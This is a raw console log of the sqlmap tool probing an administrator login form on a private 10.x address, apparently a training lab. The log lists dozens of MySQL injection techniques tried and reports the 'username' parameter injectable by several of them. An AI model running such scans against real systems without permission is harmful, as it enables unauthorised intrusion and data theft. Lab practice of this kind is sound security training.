        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.4#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:55:44 /2020-08-26/

[02:55:44] [INFO] testing connection to the target URL
[02:55:45] [INFO] searching for forms
[#1] form:
POST http://10.10.240.191/administrator.php
POST data: username=&password=
do you want to test this form? [Y/n/q] 
> Edit POST data [default: username=&password=] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] [02:56:14] [INFO] using '/home/kali/.sqlmap/output/results-08262020_0256am.csv' as the CSV results file in multiple targets mode
[02:56:15] [INFO] checking if the target is protected by some kind of WAF/IPS
[02:56:15] [INFO] testing if the target URL content is stable
[02:56:16] [INFO] target URL content is stable
[02:56:16] [INFO] testing if POST parameter 'username' is dynamic
[02:56:16] [WARNING] POST parameter 'username' does not appear to be dynamic
[02:56:16] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'MySQL')
[02:56:17] [INFO] heuristic (XSS) test shows that POST parameter 'username' might be vulnerable to cross-site scripting (XSS) attacks
[02:56:17] [INFO] testing for SQL injection on POST parameter 'username'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] [02:56:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[02:56:48] [WARNING] reflective value(s) found and filtering out
[02:56:52] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[02:56:53] [INFO] testing 'Generic inline queries'
[02:56:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[02:57:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[02:57:29] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[02:57:48] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[02:57:50] [INFO] POST parameter 'username' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable (with --not-string="not")
[02:57:50] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[02:57:51] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[02:57:51] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[02:57:51] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[02:57:52] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[02:57:52] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[02:57:53] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[02:57:53] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[02:57:54] [INFO] POST parameter 'username' is 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[02:57:54] [INFO] testing 'MySQL inline queries'
[02:57:54] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[02:57:54] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[02:57:55] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[02:57:55] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[02:57:56] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[02:57:56] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[02:57:56] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[02:58:08] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[02:58:08] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[02:58:08] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[02:58:08] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[02:58:08] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[02:58:10] [INFO] target URL appears to have 2 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] [02:58:56] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[02:59:06] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[02:59:15] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[02:59:24] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[02:59:33] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[02:59:42] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[02:59:51] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[03:00:00] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[03:00:09] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[03:00:19] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] [03:00:32] [INFO] testing if POST parameter 'password' is dynamic
[03:00:33] [WARNING] POST parameter 'password' does not appear to be dynamic
[03:00:33] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable
[03:00:34] [INFO] testing for SQL injection on POST parameter 'password'
[03:00:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[03:00:36] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[03:00:36] [INFO] testing 'Generic inline queries'
[03:00:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[03:00:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[03:01:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[03:01:11] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[03:01:30] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[03:01:48] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[03:02:21] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[03:02:40] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[03:03:10] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[03:03:30] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[03:04:01] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[03:04:02] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[03:04:03] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[03:04:03] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[03:04:04] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[03:04:05] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[03:04:05] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[03:04:06] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[03:04:10] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[03:04:10] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[03:04:10] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[03:04:22] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[03:04:22] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[03:04:47] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[03:05:17] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[03:05:42] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[03:06:06] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[03:06:29] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[03:06:52] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[03:07:16] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[03:07:40] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[03:08:06] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[03:08:29] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[03:08:56] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[03:09:21] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[03:09:46] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[03:10:09] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[03:10:20] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[03:10:36] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[03:10:37] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[03:10:37] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[03:10:38] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[03:10:38] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[03:10:38] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[03:10:39] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[03:10:40] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[03:10:41] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[03:10:42] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[03:10:42] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[03:10:43] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[03:10:44] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[03:10:45] [INFO] testing 'MySQL inline queries'
[03:10:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[03:10:56] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[03:11:14] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[03:11:25] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[03:11:47] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[03:11:57] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[03:12:16] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[03:12:41] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[03:13:03] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[03:13:26] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[03:13:49] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[03:14:04] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[03:14:18] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[03:14:34] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[03:14:49] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query)'
[03:15:13] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (heavy query)'
[03:15:35] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query - comment)'
[03:15:52] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (heavy query - comment)'
[03:16:08] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[03:16:31] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[03:16:45] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[03:17:09] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[03:17:24] [INFO] testing 'MySQL AND time-based blind (ELT)'
[03:17:47] [INFO] testing 'MySQL OR time-based blind (ELT)'
[03:18:09] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[03:18:23] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[03:18:37] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[03:18:53] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[03:19:02] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[03:19:02] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[03:19:03] [INFO] testing 'MySQL < 5.0.12 time-based blind - Parameter replace (heavy queries)'
[03:19:03] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
[03:19:04] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
[03:19:04] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
[03:19:05] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
[03:19:06] [INFO] testing 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (heavy query)'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] 
[03:19:31] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
